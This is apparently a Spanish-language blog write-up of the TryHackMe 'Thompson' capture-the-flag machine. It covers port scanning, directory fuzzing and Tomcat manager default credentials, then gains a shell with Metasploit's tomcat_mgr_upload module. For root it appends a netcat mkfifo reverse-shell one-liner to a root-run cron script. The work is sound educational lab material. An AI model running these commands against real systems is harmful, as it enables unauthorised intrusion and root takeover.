---
layout: single
title: Thompson
excerpt: "read user.txt and root.txt"
date: 2022-04-27
classes: wide
header:
  teaser: /assets/images/thm-writeup-thompson/thompson_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Metasploit
  - Tomcat
  - nmap
  - wfuzz
---

![logo](/assets/images/thm-writeup-thompson/thompson_logo.png)

 [Link](https://tryhackme.com/room/bsidesgtthompson "Thompson")

boot2root machine for FIT and bsides guatemala CTF

---

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~css
ping -c 1 {ip}
~~~

![ping](/assets/images/thm-writeup-thompson/thompson_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los ***65535*** puertos de red con el siguiente comando:
  
~~~css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.25.173
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 19:54 -05
Initiating SYN Stealth Scan at 19:54
Scanning 10.10.25.173 [65535 ports]
Discovered open port 22/tcp on 10.10.25.173
Discovered open port 8080/tcp on 10.10.25.173
Discovered open port 8009/tcp on 10.10.25.173
Completed SYN Stealth Scan at 19:54, 14.26s elapsed (65535 total ports)
Nmap scan report for 10.10.25.173
Host is up, received user-set (0.17s latency).
Scanned at 2022-04-27 19:54:08 -05 for 14s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8009/tcp open  ajp13      syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
           Raw packets sent: 70445 (3.100MB) | Rcvd: 70349 (2.814MB)
~~~

- Escaeno de vulnerabilidades sobre los puertos 22, 8009 y 8080:
  
~~~css
└─# nmap -sCV -T4 -p22,8009,8080 10.10.25.173                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 19:57 -05
Nmap scan report for 10.10.25.173 (10.10.25.173)
Host is up (0.16s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
~~~

---

- Whatweb nos da la siguiente información que nos entrega la siguiente información:

~~~css
└─# whatweb http://10.10.25.173:8080/
http://10.10.25.173:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.25.173], Title[Apache Tomcat/8.5.5]
~~~

- Revisión de la URL ***http://10.10.25.173:8080/***:

![url](/assets/images/thm-writeup-thompson/thompson_url.png)
---

## WFUZ

- Escaeno de subdominios con wfuzz:

~~~css
└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.25.173:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.25.173:8080/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                         
=====================================================================
                                       
000000090:   200        225 L    1269 W     16585 Ch    "docs"                                          
000000902:   200        30 L     141 W      1126 Ch     "examples"                                      
000004889:   302        0 L      0 W        0 Ch        "manager"                                       
000022971:   400        0 L      0 W        0 Ch        "http%3A%2F%2Fwww"                              
thompson_manager.png000024784:   404        0 L      47 W       1002 Ch     "8646"     
~~~

- Del escaneo anterior se encotró la siguiente ruta interesante ***manager***:

![manager](/assets/images/thm-writeup-thompson/thompson_manager.png)

## Burpsuite

- Analizando el código del inicio de sesión encontramos un usuario y contraseña:

![credentials](/assets/images/thm-writeup-thompson/thompson_cretentials.png)

- Ingreso al panel de administrador:

![manager](/assets/images/thm-writeup-thompson/thompson_manager2.png)

---

## Exploit

## Metasploit

- Buscando exploits para ***tomcat*** y después de usar algunos el siguiente funcionó: 

~~~css
7   exploit/multi/http/tomcat_mgr_upload 2009-11-09  excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
~~~

![manager](/assets/images/thm-writeup-thompson/thompson_metasploit.png)

- Procedemos a realizar la configuración:
  
~~~css
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.25.173
RHOSTS => 10.10.25.173
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set HTTpPassword s3cret
HTTpPassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.9.0.43
~~~

- Ejecutamos con ***exploit***

~~~css
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.9.0.43:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying i7o9QGQiRQAs6...
[*] Executing i7o9QGQiRQAs6...
[*] Sending stage (58829 bytes) to 10.10.25.173
[*] Undeploying i7o9QGQiRQAs6 ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.9.0.43:4444 -> 10.10.25.173:46024 ) at 2022-04-27 21:09:48 -0500

meterpreter > sysinfo
Computer        : ubuntu
OS              : Linux 4.4.0-159-generic (amd64)
Architecture    : x64
System Language : en_US
Meterpreter     : java/linux
meterpreter > shell
Process 1 created.
Channel 1 created.

whoami
tomcat
~~~

- Tratamiento de la shell, con el siguiente comando:

~~~python
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

## Bandera usuario

- Procedemos a listar los usuarios en el directorio ***home*** y dentro de este encontramos la respectiva bandera de usuario:

![userFlag](/assets/images/thm-writeup-thompson/thompson_user.png)

---

## Bandera root

- Busqueda de vulnerabilidades con el siguiente comando:

~~~css
tomcat@ubuntu:/home/jack$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh
~~~

- De acuerdo con lo anterior encontramos un posible vector en el script ***id.sh***, el cual procedemos a listar y nos encotramos que hace llamado al archivo ***test.txt***:

~~~css
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
~~~

- Procedemos a modificar le script anterior para que nos ejecute una reverse shell a la máquina atacante con el siguiente comando:

~~~css
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.43 4444 >/tmp/f" >> /home/jack/id.sh
~~~

- Nos ponemos en escucha por el puerto ***4444*** y ejecutamos el script, ganando nuestra shell como usuario root y su respectiva bandera:
  
~~~css
└─# nc -nlvp 4444                                                                         
listening on [any] 4444 ...
connect to [10.9.0.43] from (UNKNOWN) [10.10.25.173] 46032
sh: 0: can't access tty; job control turned off
# whoami
root
~~~

![rootFlag](/assets/images/thm-writeup-thompson/thompson_root.png)

---

## Fuentes

- Metasploit
<https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/>

---
<https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp>

---

- Root reverse-shell
<https://mica-carol-fc0.notion.site/Easy-Peasy-8f0a8d2c8fe8458cb296b3773f33a7ff>